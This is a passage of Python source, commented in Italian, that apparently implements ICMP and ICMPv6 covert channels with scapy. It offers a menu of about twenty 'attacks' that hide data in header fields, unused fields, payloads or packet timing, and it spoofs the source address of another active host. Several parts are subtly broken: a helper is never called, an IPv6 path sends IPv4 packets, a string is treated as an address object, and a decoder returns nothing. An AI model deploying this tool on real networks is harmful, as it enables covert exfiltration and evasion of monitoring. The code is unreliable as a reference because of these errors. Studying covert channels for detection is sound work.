    def wait(self, type_list:list[int]=None):      
        super().wait(type_list) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        def old_send(): 
            bit_data=[] 
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
            for piece_bit_data in bit_data:
                for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                    index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                    time.sleep(self.TEMPI_CODICI[index])  
                    pkt= (
                        Ether(dst=self.dst_mac, src=self.src_mac) /
                        IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                            src=self.ip_src.compressed) /
                        ICMPv6EchoReply(type=self.ECHO_REP) /
                        Raw()
                    ) 
                    #print(f"Sending {pkt.summary()} through interface {interface}")  
                    sendp(pkt, verbose=1,iface=self.interface)
                time.sleep(self.TEMPO_BYTE)
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("target_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        if not IS_TYPE.ipaddress(ip_src): 
            raise ValueError("ip_src non valido")
        src_mac=(
            NETWORK.GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
        pkt= (
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed) /
            ICMPv6EchoReply(type=ICMP_TYPE.v6_Echo_Reply.value) /
            Raw()
        ) 
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1,iface=self.interface) 
        for byte_data in data: 
            mask=(1<<self.numero_bit)-1  
            icmp_type=random.choice([
                ICMP_TYPE.v4_Echo_Reply,
                #ICMP_TYPE.v4_TimeExceeded
            ])
            #print("PIECE DATA:",format(byte_data, "08b")) 
            #print("MASK:",mask) 
            for index in range(0,8,self.numero_bit): 
                #print("INDEX:",index) 
                #print("4bit: ",(byte_data >> index) & mask) 
                #print("---------------") 
                index_time=(byte_data >> index) & mask 
                time.sleep(self.TEMPI_CODICI[index_time])  
                pkt= Ether(dst=self.target_mac)/\
                    IP(src=ip_src, dst=self.ip_dst.compressed)/\
                    ICMP(type=icmp_type.value, id=125, seq=225)/\
                    Raw()
                #pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface)  
            time.sleep(self.TEMPO_BYTE)

    def send_last(self): 
        pass  

    def wait_ipv6_timing_cc(self, ): 
        str_data=""
        for integer in self.data:
            str_data+=format(integer, f'0{self.numero_bit}b') 
        data="" 
        for index in range(0, len(str_data), 8):
            int_data=0
            for bit in str_data[index:index+8][::-1]:
                int_data=int_data<<1|int(bit)
            data+=chr(int_data) 

class AttackType(Enum): 
    ipv4_destination_unreachable=0
    ipv4_destination_unreachable_unused=1
    ipv4_time_exceeded=2
    ipv4_time_exceeded_unused=3
    ipv4_parameter_problem=4
    ipv4_parameter_problem_unused=5
    ipv4_source_quench=6
    ipv4_source_quench_unused=7
    ipv4_redirect=8
    ipv4_echo_campi=9
    ipv4_echo_payload=10
    ipv4_echo_campi_payload=11
    ipv4_timestamp=12
    ipv4_information=13
    ipv4_timing_channel_8bit=14
    ipv4_timing_channel_8bit_noise=15 
    ipv4_echo_random_payload=16  

    ipv6_echo=20
    ipv6_parameter_problem=21
    ipv6_time_exceeded=22
    ipv6_packet_to_big=23
    ipv6_destination_unreachable=24 
    ipv6_timing_cc=25  

    def choose_attack_function(): 
        while True: 
            print(AttackType.get_available_attack(),"\n")
            msg="Scegli il nome o il codice della funzione:\t"
            try:
                scelta=str(input(msg)).lower().strip() 
                print("Hai digitato: ",scelta if str(scelta)!="" else "<empty>") 
                attack_enum=AttackType.get_attack_method(scelta) 
            except Exception as e:
                print(f"choose_attack_function: {e}")
            if attack_enum: 
                return attack_enum
            msg="Nessuna funzione trovata. Si vuole continuare? S/N\t" 
            if not ask_bool_choice(msg): 
                return None 

    def get_attack_method(attack=None)->Enum: 
        #Data in input una qualsiasi variabile ritorna l'enum associato quando possibile
        if IS_TYPE.enum(attack, AttackType): 
            return attack 
        if IS_TYPE.string(attack): 
            try:
                return AttackType[attack]
            except KeyError:
                raise ValueError(f"Stringa attacco non valida: {attack}")  
        if IS_TYPE.integer(attack): 
            try:
                return AttackType(attack)
            except ValueError:
                raise ValueError(f"Valore numerico attacco non valido: {attack}")
        raise TypeError("Argomento non valido: atteso str, int o AttackType")
    
    def get_description(attack:Enum=None)->str: 
        if IS_TYPE.enum(attack, AttackType): 
            match attack: 
                case AttackType.ipv4_destination_unreachable: 
                    return "Usa i campi di ICMP Destination Unreachable"
                case AttackType.ipv4_destination_unreachable_unused: 
                    return "Usa icampi di ICMP Destination Unreachable. In particolare 'unused'"
                case AttackType.ipv4_time_exceeded: 
                    return "Usa i campi di ICMP Time Exceeded"
                case AttackType.ipv4_time_exceeded_unused: 
                    return "Usa i campi di ICMP Time Exceeded. In particolare 'unused'"
                case AttackType.ipv4_parameter_problem: 
                    return "Usa i campi di ICMP Parameter Problem"
                case AttackType.ipv4_parameter_problem_unused: 
                    return "Usa i campi di ICMP Parameter Problem. In particolare 'unused'"
                case AttackType.ipv4_source_quench: 
                    return "Usa i campi di ICMP Source Quench"
                case AttackType.ipv4_source_quench_unused: 
                    return "Usa i campi di ICMP Source Quench. In particolare 'unused'"
                case AttackType.ipv4_redirect: 
                    return "Usa i campi di ICMP Redirect"
                case AttackType.ipv4_echo_campi: 
                    return "Usa i campi di ICMP Echo. In particolare 'identifier'"
                case AttackType.ipv4_echo_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'payload'"
                case AttackType.ipv4_echo_random_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'payload' con dimensione variabile"
                case AttackType.ipv4_echo_campi_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'idnetifier' e 'payload'"
                case AttackType.ipv4_timestamp: 
                    return "Usa i campi di ICMP Timestamp"
                case AttackType.ipv4_information: 
                    return "Usa i campi di ICMP Information"
                case AttackType.ipv4_timing_channel_8bit: 
                    return "Usa i campi di ICMP per inviare dati tramite il tempo"
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    return "Usa i campi di ICMP per inviare dati tramite il tempo aggiungendo del rumore di sottofondo"
                #------------------------------------------------
                case AttackType.ipv6_echo: 
                    return "Usa i campi di ICMP v6 Echo"
                case AttackType.ipv6_parameter_problem: 
                    return "Usa i campi di ICMP v6 Parameter Problem"
                case AttackType.ipv6_time_exceeded: 
                    return "Usa i campi di ICMP v6 Time Exceeded"
                case AttackType.ipv6_packet_to_big: 
                    return "Usa i campi di ICMP v6 Packet to Big"
                case AttackType.ipv6_destination_unreachable: 
                    return "Usa i campi di ICMP v6 Destination Unreachable"
                case AttackType.ipv6_timing_cc: 
                    return "Usa i campi di ICMP v6 per inviare dati tramite il tempo"
                #------------------------------------------------
        raise Exception("Attacco immesso non valido: ",attack) 
    
    def get_available_attack()->str: 
        stringa="Gli attacchi disponibili sono:\n"
        for enumerator in list(AttackType): 
            stringa+=f" *{enumerator.name}:{enumerator.value}\t{AttackType.get_description(enumerator)}\n" 
        stringa+=(
            "\n" \
            "Per scegliere un attacco, usa il nome o il numero corrispondente." \
            "\nAd esempio per l'attacco Destination Unreachable TRamite ICMPv4, puoi scegliere:" \
            "\n\t*il nome 'ipv4_destination_unreachable'" \
            "\n\t*il numero '0'." \
        ) 
        return stringa


